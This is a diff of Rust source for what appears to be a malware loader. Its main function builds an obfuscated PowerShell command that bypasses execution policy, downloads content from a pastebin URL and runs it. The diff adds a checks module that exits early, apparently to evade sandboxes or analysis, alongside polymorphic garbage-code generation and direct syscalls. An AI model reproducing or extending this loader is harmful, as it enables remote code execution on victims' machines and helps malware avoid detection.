@@ -1,6 +1,8 @@
 #![allow(non_snake_case)]
+#![allow(unused_unsafe)]
 mod obf;
 mod syscalls;
+mod checks;
 use crate::syscalls::SYSCALLS;
 use std::mem::{size_of, zeroed};
 use std::ptr::null_mut;
@@ -27,6 +29,9 @@ fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
 }
 #[polymorph(fn_len = 30, garbage = true)]
 fn main() {
+    if checks::run_all_checks() {
+        return;
+    }
     let malicious_command = obf_str!("powershell.exe -ExecutionPolicy Bypass -Command \"IEX (Invoke-WebRequest -Uri 'https://pastebin.pl/view/raw/0ae25fc9' -UseBasicParsing).Content\"");
     let malicious_command_wide = to_wide_chars(&malicious_command);
 
